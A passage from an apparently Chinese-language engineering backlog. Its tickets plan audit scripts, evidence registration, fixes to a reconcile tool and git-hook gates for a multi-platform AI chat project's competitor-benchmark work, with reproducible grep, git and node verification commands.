8. **风险与回退**：六端纳管第一轮必然点出一片存量 ⇒ 只走棘轮不判红（与改动无关的 blocking 红 ⇒ 各会话 `--no-verify` ⇒ 全部守门作废，AGENTS 的"恒红门"条，注意该节实际标题是 **§12f** 而全仓引用写作"§12e 同型"）。回退 = 撤销注册块（用同一取号器反向删）。**需 §24 拍板**：档案表初始内容 = 正式承认"某端不做某回调"，属对外能力清单变更，预填方案：`apps/miniapp-taro` 声明 {chunk, tool_call, tool_result, plan_updated, done}，`reason:"小程序无 EventSource，走分块 wx.request；其余帧未接线"`, `until:2026-12-31`；`apps/extension` 声明 {chunk, done}，同格式；其余端首轮一律**不写档案**，由门逐条报名，逼下一轮显式表态。

### D140 尺子②:对标交付核验尺子缺失(V3 §八 自留建议至今未落地;取证 2026-09-28)

1. **目标行为**：一条对标差距被代码修掉之后，账面会喊"这条已过期"，而不是继续挂着让人重做。
2. **现状锚点**：`scripts/audit-benchmark-delivery.mjs` 两面均不存在（复验：`ls scripts/audit-benchmark-delivery.mjs` 与 `git cat-file -e HEAD:scripts/audit-benchmark-delivery.mjs` 双双落空）。V3 原文位置已定位：`docs/AI_CHAT_BENCHMARK_ANALYSIS_V3.md:260`（#51）与 `:462`（#73）。票面两条"已被代码推翻"复验为真，但**票面的量法是错的**：它写"`task_executors.py` 现读 16 个 `async def`"，而 16 含两处嵌套 helper（`:869`/`:973`）；权威判据是注册表——`IMPLEMENTED_TASK_TYPES` 8 类（`:76-85`）= 6 真实 + 2 自证 stub（`STUB_TASK_TYPES=("sleep","echo")`，`:88`），且 `dag_scheduler.py:563` `_default_executor` 已注明"真实分派，不再是 echo"。#73 侧：`apps/miniapp-taro/src/pkg-ai/ai/chat.tsx` 1,623 行（HEAD 面与工作树面同值，`git show HEAD:… | wc -l`）。
3. **改动分解**：
   - 步 1（设计前提，非代码）：条目必须拆到**可判子断言**粒度——#51 是两个断言（run_in_background 有真实类型 / DAG executor 不回显），#73 是一个断言（小程序有对话页）。整票判"已交付"会把未拆的半边洗白。
   - 步 2：`scripts/audit-benchmark-delivery.mjs` [新]，输入 = V3/V4 的条目正文，逐条按"锚点表达式"（路径+标识符+期望态）判三态：已交付 / 仍存在 / **判不出**；判不出既不得并入"仍存在"也不得并入"已交付"。
   - 步 3（必须内置的两种型）：① **路径搬家**——V3 #73 字面说"`pages/` 下无 chat"，真身在 `pkg-ai/` 子包，按原文字面路径判会得到"仍存在"（假差距）；判据须允许一条断言挂多个候选锚点并在报告里点名用的是哪个。② 语义等价检查（AGENTS 模板硬规矩 3）：判"缺"前须跑别名集（如 rewind/revert/backtrack）。
   - 步 4（定级）：warn 且**不进提交链**（它判文档与代码是否一致，与本次提交内容无关；blocking 就是恒红门）；问责走手动 + 可选接 `pnpm check:all` 尾列。复跑命令：`node scripts/audit-benchmark-delivery.mjs --doc docs/AI_CHAT_BENCHMARK_ANALYSIS_V3.md`。
4. **受影响文件**：`scripts/audit-benchmark-delivery.mjs` [新]、`scripts/tests/audit-benchmark-delivery.test.mjs` [新]（§22c 镜像，源文件须先按 §22d 加 `isDirectRun` + `export const __test__`）、`package.json`、`AGENTS.md`、`README.md`。
5. **跨端与 i18n**：工具层单端（根 scripts/），平台独占：工程判据非产品能力；无 i18n 键。
6. **验收判据**：① 喂 V3 现文必须点名 #51/#73 为已交付（`--json` 里 `verdict:"delivered"` 且带命中的锚点路径）；② 构造假条目（断言一个不存在的标识符）必须落 `undetermined` 或 `still-open` 之一，**且两态不得互串**；③ 反向对照（有牙证明）：把 `chat.tsx` 在某临时索引里改名后重跑，#73 必须从"已交付"翻走——只判"改坏就红"不够，还要判"搬家不红"（步 3①）；④ 明令禁止 `--update`：不得把读数冻成基线（照 `scripts/check-plan-sha-resolvable.mjs` 那条"warn 级 + 禁 --update"的先例）。
7. **依赖与顺序**：独立可派；D167 修的是**同族另一把尺子**（reconcile.mjs），两者互不挡；D141 的判定表会复用本尺子的三态口径，故 D141 建议排后。
8. **风险与回退**：最大风险是尺子给出"整票已交付"的假结论（#51 的 stub 仍在，只是自证了）。处置：输出面强制打印每条的子断言与命中锚点，不打印即视为判不出。回退 = 删脚本与 package.json 行（无下游依赖）。不需 §24（纯工程判据，不引入对外能力）。

### D141 尺子③:竞品控制帧↔我方能力的等价性判定表从未做过(本轮新开;取证 2026-09-28)

1. **目标行为**：拿到"竞品有 X 帧"这张表的人，同时能看到"我方到底有没有、叫什么名"，而不是按标识符零命中就补一个功能。
2. **现状锚点**：
   - **本票的一手证据不在受控面**（推翻票面前提）：77 控制帧清单里的 `add_directories` / `rewind_files` / `set_goal_max_turns` 在 `docs/benchmark-evidence/2026-09/` 全目录 grep **0 命中**（复验：`grep -rniE "add_director|set_goal_max_turns|rewind_files" docs/benchmark-evidence/2026-09/`）。已入库的三份是**文案清单**（`chat-stream-inventory.md`，16 类路由），不含控制帧表。⇒ `未取证:77 这个数字与逐帧原文无法在受控面复现`。
   - 三条假差距的否证已复验为真：`apps/ai-service/app/routers/checkpoint_rewind.py:85-88` `pattern="^(conversation|code|both)$"`（票面写 `:80/99`，现读行号为 85-88/267，形态一致）；`apps/api/src/routes/chat.ts:544` `POST /conversations/:id/auto-title`；`apps/ai-service/app/routers/mcp.py:84-85` `reconnect` / `max_reconnect_attempts`。
   - 确证真缺（唯一一条）复验为真：`git grep -niE "add_director|extraDir|additionalDir|multiRoot" HEAD -- apps packages` 零命中。
   - WorkBuddy 无取证物：`C:/Users/Administrator/.workbuddy/IDENTITY.md` 存在（在仓外，只读确认），按票面继续只作 E5 方向参考。
3. **改动分解**：
   - 步 1（先补证据，否则整票是空转）：把控制帧清单落 `docs/benchmark-evidence/2026-09/qoder-control-frames.md` [新]——逐帧原文 + 取法命令（`asar-read.mjs --get /node_modules/@qoder-ai/qoder-cn-agent-sdk/dist/index.js` 再按 `case` 穷举），版本号钉 `qoder-cn v0.4.3`（README:19 已登记该版本）。
   - 步 2：判定表 `docs/benchmark-evidence/2026-09/qoder-control-frames-equivalence.md` [新]，逐帧三态（真缺 / 我方等价但另名 / 竞品也无），**每条"真缺"必须附我方侧否证命令与输出原文**，每条"等价但另名"必须附两侧 file:line。
   - 步 3：把"不得按标识符零命中直接记'没有'"写成可执行判据：判定表里凡 verdict=真缺 的行，其 `否证命令` 字段必须**同时含别名集**（表内强制列），缺列即由 D140 的尺子判"判不出"。
4. **受影响文件**：`docs/benchmark-evidence/2026-09/qoder-control-frames.md` [新]、`docs/benchmark-evidence/2026-09/qoder-control-frames-equivalence.md` [新]、`docs/AI_CHAT_BENCHMARK_ANALYSIS_V4.md`（引用节）、`docs/benchmark-evidence/2026-09/README.md`（登记两件新文件与复现命令）。
5. **跨端与 i18n**：本票只产判定表，不动代码；若表中"真缺"转为功能票，那票按 §9 逐端处置并走 §19 五语言同批（新增用户可见入口必给键）。
6. **验收判据**：`git grep -F "add_directories" -- docs/benchmark-evidence/2026-09/` 命中（证明一手帧表已入库）；判定表内 verdict=真缺 的行数 = 1（现读只有多根工作区），且该行带可粘贴执行的否证命令；反向对照：任取一条已否证的等价项（`rewind`→`checkpoint_rewind.py:85`），删掉两侧 file:line 后由 D140 尺子跑，必须落"判不出"而不是"已交付"。
7. **依赖与顺序**：**被 D157 残余挡**（控制帧提取物未入库）；前置 = 先跑步 1。与 D139/D140 可并行（D140 建议在前，复用其判据口径）。
8. **风险与回退**：风险是按帧名直译造重复实现（我方 `checkpoint_rewind` 已覆盖 rewind 两帧）——故"等价但另名"必须写进表而非新写代码。回退 = 删两份新 md（纯登记，零下游）。**需 §24 拍板**：唯一真缺"往当前工作区追加目录（多根工作区）"是新增对外能力，预填方案：`apps/cli` 侧加 `--add-dir <path>`（可重复）+ `ToolContext.additionalDirectories: readonly string[]`，权限档默认 **deny-by-default**（追加目录须逐次批准，理由：越过工作区边界即越过 §5 的授权面）；web/RN 端本轮**不做**并标"平台独占：桌面/终端语义"。

### D150 运行时对账未做(如实登记,不得读成"已验证"):本机无 PG/Redis 端口,对话链跑不通(取证 2026-09-28)

1. **目标行为**：交付报告里的"已实测"三个字，只有真跑过对话才允许出现。
2. **现状锚点**（复验通过）：`curl -s -o /dev/null -w "%{http_code}" http://localhost:{8801,8802,8803,8810,8811}/` 五端口全 `000`；`netstat -ano | grep LISTENING | grep -cE ":(8801|8802|8803|8810|8811)\b"` = **0**。⇒ 本轮全部结论均为静态代码 + 竞品资源包取证，无一来自运行时。
3. **改动分解**：
   - 步 1（止血，零代码）：在 `docs/AI_CHAT_BENCHMARK_ANALYSIS_V4.md` §六 追加一条"运行时取证未做"的限定，并把族 C 内所有含"实测"字样的句子逐条改为"静态实测/未跑运行时"——防下一个人把静态结论读成端到端结论。
   - 步 2（根治，需环境）：起 web+api+PG+Redis 后按 AGENTS §17 补 4 状态截图 + `getComputedStyle` 数值取证，落 `.ihui-agent/tmp/d150-runtime/`（gitignore 内，不入库，只在报告里引用）。
   - 步 3（判据口径）：**本轮不立"必须有运行时取证"的门**——它判的是机器状态，提交者结构上满足不了，blocking 就是恒红门（同 `check-desktop-cache-plaintext` 定 warn 的理由）。
4. **受影响文件**：`docs/AI_CHAT_BENCHMARK_ANALYSIS_V4.md`（措辞限定）；步 2 无仓内文件产出。
5. **跨端与解阻**：解阻前置是环境，不是代码；端口取 `docs/port-management.md` 注册表；触发构建/部署前须 `node scripts/deploy-lock.mjs check`。
6. **验收判据**：`curl -s -o /dev/null -w "%{http_code}" http://localhost:8801/` 仍为 000 时，任何本族交付报告**不得**出现"运行时已验证"；反向对照：把 §六 那条限定句删掉后跑 `node scripts/merge-live-doc.mjs --file docs/AI_CHAT_BENCHMARK_ANALYSIS_V4.md` 必须报出该行被退回旧态（用活文档对账器兜措辞回退）。
7. **依赖与顺序**：挡住 D139 扩面后的"端接线是否真上屏"验收，以及 V4 #93/#94 的验收；不挡 D140/D141/D156/D157/D160/D167/D168/D169。
8. **风险与回退**：起服务属环境动作，不改仓内代码故无 git 回退；本机是**开发机**（AGENTS §5b 深夜更正：无 IHUI* 服务、五端口零监听），"怕影响生产而暂缓"不成立，但"没有 PG 端口 ⇒ 迁移本机不可应用与验证"这条要如实写。不需 §24（无新增能力）。

### D156 否证入库:竞品自身也没有的六件事,不得列为我方差距(一手取证 2026-09-28,Qoder bundle 与 Codex app-server schema 内逐条零命中实证)。

1. **目标行为**：下一个做对标的人，开局就有一张"这六件别做，竞品也没有"的拦幻影清单。
2. **现状锚点**（五条复验为真、一条未取证）：① `chatTimeline.turnFallback`"第 {{count}} 轮"已入库于 qoder 清单 `:32`/`:350`；② 思考块只给时长 `agentWorkDuration:"耗时 {{seconds}}秒"`（`:36`）；③ `executionTrace.filter:"筛选执行事件"`（`:38`）；④ "echarts/Chart.js 0 命中"陈述在 `:34` 与 `:4903`；⑤ Codex 四键在 codex 清单 7 处命中且**逐处都是"未取证到"陈述**（`:122/:123/:124/:389/:426/:544/:576`）⇒ 票面"四个键全零命中"成立；⑥ **`未取证`：Trae 中文 map 里 10MB/50MB/1000 三数为 `{a}/{b}/{c}` 占位符**——trae 入库清单内未定位到该组，需 `trae/_work` 中间产物（现不在受控面，见 D157）。
3. **改动分解**：
   - 步 1（纯登记）：把六件事写进 `docs/AI_CHAT_BENCHMARK_ANALYSIS_V4.md` 新增小节"竞品缺口清单（不得列为我方差距）"，每条含：键名 + 显示串 + 否证命令 + 现读出处行号；第⑥条按 `未取证` 措辞登记，**不得**写成已实证。
   - 步 2（给未来尺子的坑）：④ 的陈述行本身含 `echarts`/`Chart.js` 字样 ⇒ 未来任何"零命中判缺"的判据必须排除**自指陈述行**（同 reconcile.mjs 那一型；反例：直接 `grep -c` 得 2 而非 0）。把这条写进 §六 的验收基线第 5 条旁边。
4. **受影响文件**：`docs/AI_CHAT_BENCHMARK_ANALYSIS_V4.md`。
5. **跨端与 i18n**：不适用（文档登记，无端产物）。
6. **验收判据**：新小节内六条每条都有可粘贴的否证命令；反向对照：把第⑤条的 7 处 `grep -n -E "conversation_detail_mode|…"` 输出行号改掉任意一条使其指向不存在的行，评审必须能凭命令复跑出矛盾（判据对象是"命令可兑现"，不是"文字看起来对"）。
7. **依赖与顺序**：无前置；第⑥条待 D157 把 trae 中间产物入库后方可补齐。
8. **风险与回退**：风险是把"未取证到"读成"竞品没有"，从而反向确认我方不做——票面禁令正是这条，须在正文显眼复述。回退 = 删该小节。不需 §24（不引入能力）。

### D157 取证物不受版本控制 = 本轮一手证据下一次全部重做(实测 2026-09-28,元缺陷)

1. **目标行为**：换一台机器仍能用一条命令复核票面引用的每个键名，不必重解 373MB 的 asar。
2. **现状锚点**：三份竞品清单 + 两把工具**已入库**（`git ls-files docs/benchmark-evidence/2026-09/` = 14 路径，含 `README.md`/`asar-read.mjs`/`diff-matrix.mjs`/`reconcile.mjs`/`web-bind2.tsv`/`_callbacks.txt` 与 5 份 reconcile 导出件），README `:14-20` 已钉版本与 md5 ⇒ 票面"半收口"为真。剩余待做的**具体形状**已现读：`grep -cE "^export"` 与 `grep -c isDirectRun` 在 `asar-read.mjs`、`diff-matrix.mjs`、`reconcile.mjs` 上**全部为 0**，`grep -c "self-test"` 亦为 0；而 `docs/benchmark-evidence/2026-09/README.md:23` 声称"两件工具的不变量由各自自检钉"——**文档与磁盘不符**（D149 那一型），票面"剩余只有一件"低估了：加测试之前必须先补 §22d 入口守护，否则测试一 import 就触发 CLI 副作用。
3. **改动分解**：
   - 步 1（前置）：三件工具各加 `isDirectRun` 守卫（模板照 AGENTS §22d，必须经 `pathToFileURL`）+ `export const __test__ = {…}`，放在 `if (isDirectRun)` **之后**。
   - 步 2：§22c 镜像测试 `scripts/tests/benchmark-evidence-tools.test.mjs` [新]，判据输入**取自真实入库文件形态**（模板硬规矩 + §22c 红线：夹具只复刻实现形状 = 复读机）。
   - 步 3（就地更正 README:23）：要么把自检真装上，要么把那句改成"当前无自检，见 D157"——不得留跑不通的出路（AGENTS「文档不得写跑不通的出路」）。
   - 步 4（**落点先量再定**）：票面要求"升为常驻 `scripts/`"，但迁址会造成悬空引用（守门 98 同族）。先跑 `git grep -l "benchmark-evidence/2026-09/asar-read\|diff-matrix" HEAD -- .` 数指针；现读 `PROJECT_PLAN.md` D157/D160 两行与 README 均按原址点名 ⇒ **建议原址保留 + 加测试**，把迁址单列一句"若迁则同批改全部指针"。
4. **受影响文件**：`docs/benchmark-evidence/2026-09/asar-read.mjs`、`docs/benchmark-evidence/2026-09/diff-matrix.mjs`、`docs/benchmark-evidence/2026-09/reconcile.mjs`、`docs/benchmark-evidence/2026-09/README.md`、`scripts/tests/benchmark-evidence-tools.test.mjs` [新]。
5. **跨端与 i18n**：工具层，不适用；改完须跑 `node scripts/check-watermark-coverage.mjs`（现读该目录 `.mjs` 水印完整，改动不得丢横幅；注意注入会剥 BOM 那一族坑）。
6. **验收判据**：① `node --test scripts/tests/benchmark-evidence-tools.test.mjs` 末行现读通过数；② 票面键名可命中受控面：`git grep -F "editRewindConfirmTitle" HEAD -- docs/benchmark-evidence/2026-09/` 非空（复验已成立，qoder 清单 `:202`）；③ 反向对照：删掉某个 `export const __test__` 键 ⇒ 镜像必须红（§22c 三阶段检测，漂移即失败）；④ README:23 那句与实测一致（跑 `grep -c "self-test" docs/benchmark-evidence/2026-09/asar-read.mjs`，其值必须 ≥1 或该句已被更正）。
7. **依赖与顺序**：**挡 D141**（控制帧清单需要 asar-read 可用且有自检）；与 D167 同文件面（`reconcile.mjs`），两票必须串行以免同文件互写。
8. **风险与回退**：动 `reconcile.mjs` 会与 D167 撞车 ⇒ 顺序：D167 先改判据、D157 后装 isDirectRun（或反之，但同一文件不得并行派）。回退 = revert 该文件。不需 §24。

### D160 我方侧对话流穷举两路代理均撞轮次上限,对账矩阵缺一侧(实测 2026-09-28,派单粒度缺陷,须拆票)

1. **目标行为**：派出去的取证票会先把清单落盘再回报，不会烧完 token 只剩零交付。
2. **现状锚点**：`.ihui-agent/tmp/v5-evidence/` 顶层现读 **17 个文件**（票面写 19，现值以 `find .ihui-agent/tmp/v5-evidence -maxdepth 1 -type f | wc -l` 为准），该目录共 534 文件且已混入他票产物；`.gitignore:163` 的 `.ihui-agent/*` 使整面被忽略（`git check-ignore -v` 复验命中）。票面点名的四件产物：`web-bind2.tsv`、`_callbacks.txt` **已入库**；`web-zh2.txt`、`orphan.mjs` **仍在 tmp**（复验：`git ls-files docs/benchmark-evidence/2026-09/ | grep -c <名>` 依次为 1/1/0/0）。
3. **改动分解**：
   - 步 1（止血）：把"一类 × 一端、单票 ≤200 条、任务书必写『接近上限先把清单写盘再回报』"三条写进 `AGENTS.md §11` 的派单格式格（它是模板，不是判据——判据化会撞 §24）。
   - 步 2：将 tmp 内 `web-zh2.txt` / `orphan.mjs` 按 D157 同法入库到 `docs/benchmark-evidence/2026-09/ours/` [新]（入库前跑水印，入库后在 README 登记取法）。
   - 步 3（拆票）：16 类拆成 4 张子票，每张产出一个受控 inventory：`docs/benchmark-evidence/2026-09/ours/inventory-{A..D}.md` [新]；每票必须同时要求两把尺子（包内字面量 + 真实窗口树），并禁止拿一把的绿灯当另一把的结论（V4 §8.4）。
   - 步 4：矩阵 `docs/benchmark-evidence/2026-09/matrix.md` [新]，由 `diff-matrix.mjs` 产出，**两侧都非空才允许存在**（一侧空即 exit 非 0）。
4. **受影响文件**：`AGENTS.md`、`docs/benchmark-evidence/2026-09/ours/*` [新]、`docs/benchmark-evidence/2026-09/matrix.md` [新]、`docs/benchmark-evidence/2026-09/README.md`。
5. **跨端与 i18n**：inventory 覆盖 6 端 UI 面（web / miniapp-taro / mobile-rn+packages.app / extension / desktop / cli）；纯取证登记，不新增键。
6. **验收判据**：`node docs/benchmark-evidence/2026-09/diff-matrix.mjs --check` 末行报"两侧条目数 N/M"且两者 >0；反向对照：删掉我方侧任一张 inventory ⇒ 必须从"绿"翻成"缺一侧"而非"少几行"（证明它判的是**存续**不是行数）。
7. **依赖与顺序**：步 2/3 依赖 D157（工具入库 + 自检在位）；步 4 依赖 D167（尺子先修，否则矩阵数字不可用）。
8. **风险与回退**：宽题复发自证——若拆票仍按"多类多端"派，会二次撞上限；回退 = 只保 AGENTS 那段模板改动，删新目录。不需 §24（工程方法，非对外能力）。

### D167 修复对账器 reconcile.mjs 两处会产出假差距的缺陷(承 V4 §9.3;取证工具卫生,不修则本目录所有族级数字不可用)

1. **目标行为**：族级条数能用于归因；不能用的时候，工具自己会说"这一维别引用"。
2. **现状锚点**（三条复验 + **一条票面未列的新缺陷**）：
   - ① 族归属跨块串行：`reconcile.mjs:154` `let section='',family=''`，`:160` 遇 `### ` 才赋 fam，**遇新表/新节不复位**。实证：`reconcile-附录D.md` 与 `reconcile-附录E.md` 整块 87 行 + 全部行都挂 `fam=tagPill`（复验：`grep -h "^| 附录" docs/benchmark-evidence/2026-09/reconcile-附录D.md | awk -F'|' '{print $3}' | sort -u` → 只有 `tagPill`），`:16` 即 `102/请求时间校验失败`。**票面"该族 90 条"现读为 87 行**（`grep -c "| tagPill |"`）。
   - ② 非文案过滤不全：枚举前缀只盖 `idle|pending|ghost` 等（`matchOne` 内第二道 skip 正则），现读 MISS 面仍有 **27 行原文不含 CJK**（`tagPill.dir`/`ltr`、`copying`、`copied`、`tablist`、`ease-out`、`material`、`sm`/`md`…；命令：`grep -h "| MISS |" reconcile-*.md | awk -F'|' '$5 !~ /[一-鿿]/' | wc -l`）。
   - ③ 假阳率自检缺失：§9.2 实测 2/5 = 40% 否证样本从未固化成用例。
   - ④ **[新发现] 混合取材面**：语言包语料走磁盘（`:54-56` `fs.readFileSync(path.join(ROOT,'packages/i18n/messages/web/zh-CN.json'))`），而源码语料走 HEAD（`:68-78` `ls-tree` + `cat-file --batch`）——**与同文件 `:60-62` 注释自述的"口径必须是被审面"直接矛盾**。现读 `git show HEAD:packages/i18n/messages/web/zh-CN.json | md5sum` 与磁盘 `md5sum` 相同 ⇒ 本刻不虚高，但结构不闭合（语言包是本仓最常被并行会话改的文件，D160/D141 都要动它）。
3. **改动分解**（顺序即判据，**先修尺子、再谈数字**）：
   - 步 1：fam 复位——遇 `^## ` / `^### ` / 新表头 / 代码块边界一律 `family=''`，行内 fam 为空 ⇒ 落 `fam:"(未判定)"` 桶并**在导出件抬头印一行"族级数字不得引用"**。
   - 步 2：值层判定改走"是否含 CJK 且非纯枚举"（替换键名启发式为主筛），保留键名筛作第二道。
   - 步 3：语料两半统一走 HEAD（消除缺陷④），任一 corpus 取不到 ⇒ exit 2 拒绝出结论。
   - 步 4：把 §9.2 的否证样本固化成 `--self-test` 用例（含 `composer.edit:"编辑此消息"` 我方为 `"edit":"编辑"` 这一条 Jaccard 必不中的型）。
   - 步 5：重跑五份导出件，输出**修前/修后 MISS 差额逐条列名**（不得以"数字变小"自证正确）。
4. **受影响文件**：`docs/benchmark-evidence/2026-09/reconcile.mjs`、`docs/benchmark-evidence/2026-09/reconcile-*.md`（5 份重生成）、`docs/AI_CHAT_BENCHMARK_ANALYSIS_V4.md`（§9.1/§9.3 数字随修后现读更正）、`scripts/tests/reconcile-ritual.test.mjs` [新]（或并入 D157 那件镜像文件）。
5. **跨端与 i18n**：不适用（量具）；语料面含 5 端语言包，改动不得只取 web 一份而不报名。
6. **验收判据**：**有牙的构造面用例（不依赖仓库瞬时状态）**——在临时目录合成一份 LIST：`## 节一` + `### famA` + 一行表数据，紧接 `## 节二` + 一行表数据；喂匹配器后断言第 2 条的 `fam` **不等于** `famA` 且落 `(未判定)`；把 `family=''` 的复位删掉 ⇒ 同一用例必须翻红。**三条定级硬要求**：先跑现读存量 `node docs/benchmark-evidence/2026-09/reconcile.mjs --self-test`（若新判据在真仓产出红，按"该文件 HEAD 自身存量"套棘轮，不得当场 blocking）；本工具**刻意不进提交链**（判文档与代码一致性，与提交内容无关）；取不到 ⇒ exit 2 判"无法判定"，不得记绿。反向对照另加一条：把 `our` 语料清空必须 exit 非 0（现有 `:140` 已有该守卫，改面后须复验它仍咬得住）。
7. **依赖与顺序**：**前置于 D160 步 4 与任何族级数字引用**；与 D157 同文件面，必须串行（见 D157 第 8 栏）。
8. **风险与回退**：修完族级数字会大幅变动（87→更细），**必须在导出件抬头与 V4 §9.1 同步更正**，否则旧数字继续被引用；回退 = `git revert`（本票不执行任何 git 写操作）。不需 §24。

### D168 清偿台账里 24 行 `G-G-` 型畸形登记号(新判据上线后由它自己量出;归属:台账归并线持有人)

1. **目标行为**：台账里的登记号只有"族名出现一次"这一种形态，编号可被任何按主键的判据认出。
2. **现状锚点**：判据在 `scripts/live-doc-edit.mjs:481` `MALFORMED_ID_RE = /^-\s\[[ xX]\]\s*\**\s*([A-Za-z]{1,4})[-－]?\1[-－]?\d/`，存量只报数在 `:746`。**票面"24 行 / {G:24}"现读已变**：用该门导出的纯函数喂 HEAD 面 ⇒ **27 行，分布 `{G:26, D:1}`**（HEAD 与索引同值）。复验命令：`node --input-type=module -e "import {findMalformedIds} from './scripts/live-doc-edit.mjs'; …git show HEAD:PROJECT_PLAN.md…"`. 另注意：按"整行含 `G-G-`"粗数得 91 行，与判据的 27 行不等——**差异全部来自"编号必须落在剥掉复选框后的正文开头"这条判据（AGENTS §1 行首裸编号条）**，不得拿 91 当存量。
3. **改动分解**：
   - 步 1（顺序不可颠倒）：先按标题族折叠归并副本（`node scripts/plan-tasks-merge.mjs --heal`），再给真撞号让号——`0dde5ff82` 的教训写在行内，反过来会"消 3 组同时新增 3 组"。
   - 步 2：逐枚把 `G-G-<n>` 改回 `G-<n>`，改前 `grep -c "^- \[.\] G-<n>"` 确认目标号未被占用。
   - 步 3：**禁止**整块删除畸形行（会抹掉别人登记正文，守门 71 判红）；**禁止**为让报数归零放宽判据。
   - 步 4（活文档四步序）：报告 → 提交 → 立刻 `git show <新提交>^..<新提交>` 行级对账 → 有丢失就地回补（提交前那次报告有时效边界）。
4. **受影响文件**：`PROJECT_PLAN.md`（唯一）。
5. **跨端与 i18n**：不适用（台账）。
6. **验收判据**：① `node scripts/live-doc-edit.mjs` 任一正当落地的输出行"台账存量畸形编号 N 行"必须降到 **0**（现读 27）；② `node scripts/plan-tasks.mjs --gate` 的 F9 撞号组数不得因本次改号上升（逐组比基线）；③ F1 同主键两态并存保持 0；反向对照：只改 1 行而把它写成 `G-G-G-1` ⇒ 判据必须仍计入（族名两次即红，证明放宽后仍能认新形态）。
7. **依赖与顺序**：无前置；**归属为台账归并线持有人**，与本族其他票共用 `PROJECT_PLAN.md` ⇒ 不得与 D167/D157 的文档改动同轮落地（共享工作树活文档互写）。
8. **风险与回退**：改号会让守门 71 的"按编号原文搜"找不到旧串——它是**判丢失**不是判多余，改号属正常改写（保留编号即不报），仍须提交后 diff 复验。回退 = revert 单文件。不需 §24。

### D169 补上「活文档正文点名的文件被整条移出索引」这一格判据(承 V4 §九 对账件交付;归属:工具层持有人,现在没有尺子可跑)

1. **目标行为**：一次不带 pathspec 的普通提交，不能悄悄把交付报告里点名承诺的那批取证件从版本树里删掉。
2. **现状锚点**（票面成立，且**三道门的失明点定位与票面不完全一致**）：
   - 现读三面一致、6 件在位、无暂存删除：`git diff --cached --name-only --diff-filter=D -- docs/benchmark-evidence/` 为空，`git status --porcelain -- docs/benchmark-evidence/` 为空 ⇒ **本行登记缺口，不是存量**（票面已自注，复验一致）。
   - 守门 99：`scripts/check-staged-deletions.mjs:69` 明示"`.md`/`.txt` 里提到某路径是叙述,不是依赖"，且自检 ⑩（`:649`）把这个行为钉住 ⇒ **不得翻转 E1**（票面同此）。
   - `scripts/heal-worktree-tracked.mjs`：真正挡住这一型的是**第四层** `restoreBypassOrphans` 的判据③"磁盘上没有该文件才碰"（`:592-613`，理由 = §16 越权红线），而不是票面写的第三层③"工作区==索引"；票面对"结构上够不到"的结论对，归因需更正。
   - 守门 71 只判登记行编号是否消失，不判被点名文件是否在位。
3. **改动分解**（先量存量，再决定形态与定级）：
   - 步 1（**定级前置**）：现读存量命令已跑，结论：**裸判"正文点名即须在位"必造恒红门**——四份活文档（`PROJECT_PLAN.md`/`AGENTS.md`/`README.md`/`docs/AI_CHAT_BENCHMARK_ANALYSIS_V4.md`）HEAD 面反引号点名的仓库内路径 **1,365 条唯一提及中 99 条不在 HEAD 树**，其中合法缺席者包括被 `.gitignore` 忽略项（`apps/ai-service/.env`、`deploy/prod-bundle/pg-backup.ps1`）、省略号形态（`packages/shared/.../redact.test.ts`）与已定性死引用（`scripts/_ai_dev_independent.cmd`）。⇒ 若 >0（已 >0）**走棘轮，锚点 = 该文件 HEAD 自身存量**，且必须先做三件收窄：① 忽略面豁免（照 `scripts/check-prod-bundle-shadow.mjs` 的 S2 gitignore 语义，"缺运行副本=未判定不判红"）；② 含 `...`/通配/非具体路径的形态一律落"判不出"并报名；③ 只认**该路径曾出现在被审面**的（即"被移出"而非"从未存在"）。
   - 步 2（形态选择）：`node scripts/plan-tasks.mjs --open` 之后二选一——(A) 新门 `scripts/check-live-doc-path-survival.mjs` [新]；(B) 并入守门 99 作 E3（**新增判据维，不动 E1**）。建议 (A)：99 的判据输入是"暂存删除集"，而本型的危险窗口是"索引记 D 而任何人一次普通提交就落地"，(A) 可在全量档就报警。
   - 步 3（同批改两半）：内容判据 + 枚举面（文档清单与"形如 `docs/`、`scripts/`、`apps/`、`packages/` 的反引号路径"超集）必须同笔；预筛必须是判据字面量超集（守门 102 的锁同族）。
   - 步 4（接线三件套，缺一不可）：`scripts/gate-registry-insert.mjs` 以 HEAD 为底插入 → **编号一律现读**（`node scripts/gate-registry-insert.mjs` 自己取 max+1，不得照本文或任何文档派号）→ `skipEnv` 定名 `HUSKY_SKIP_LIVE_DOC_PATH_SURVIVAL=1` → AGENTS「守门脚本速查」+ `README.md:2787` 工程守门节同枚点名（守门 89 R4/R2）。
4. **受影响文件**：`scripts/check-live-doc-path-survival.mjs` [新] 或 `scripts/check-staged-deletions.mjs`（择一）、`scripts/guardian-runner.mjs`、`scripts/tests/check-live-doc-path-survival.test.mjs` [新]、`AGENTS.md`、`README.md`。
5. **跨端与 i18n**：工具层单端；无 i18n。
6. **验收判据**：**有牙的构造面用例（不依赖仓库瞬时状态）**——`mkScratch` 临时仓里造三态：① HEAD 含 `docs/x.md`、正文点名它、索引把它记成删除 ⇒ **必红**；② 同一文件仅在 `.md` 叙述里出现、由守门 99 的 E1 档判 ⇒ **必绿**（这条反向锁防止有人把 .md 一律升成删除凭据 ⇒ 满天假红 ⇒ 恒红门 ⇒ 跳钩子连带全部守门作废）；③ 该路径从未在被审面存在过 ⇒ 判"从未存在"不计债也不计通过。另加：定级前置 = 步 1 现读命令必须出现在交付报告里（含 99 这个数字的来源命令）；**注册与脚本必须同枚入库**——验收句 `git cat-file -e HEAD:scripts/check-live-doc-path-survival.mjs` 成立且 `grep -c check-live-doc-path-survival scripts/guardian-runner.mjs` ≥1（本仓实录：注册块入库而门体仍未跟踪 ⇒ 干净检出上整批门失败，而守门 89 的 R1/R2/R4 结构上看不见这一格，现由 R9 兜，复验 `grep -n "R9" scripts/check-gate-wiring.mjs` 命中 `:58/:717/:1176`）。
7. **依赖与顺序**：不挡本族其他票；但 D157/D160 的"取证物入库"是它首个真实用例面 ⇒ 建议排在 D157 之后，好让它第一轮就有一条正当红可判。
8. **风险与回退**：最大风险就是它要防的那一型的镜像——**为了消红把判据放宽到"整仓扫 .md 引用"**；判据必须只在"正文点名 + 曾被审面包含"这一交集上判红。定级：步 1 现读若仍 >0（大概率，因存量含合法忽略项），首轮 blocking 只在 `--staged` 档 + 收窄判据上生效，全量档只报数。回退 = 撤注册块 + 删门体（同枚）。不需 §24（工程约束自身增量属豁免场景）。

---

## 族内共用的三条落地口径（派单人勿逐票重推）

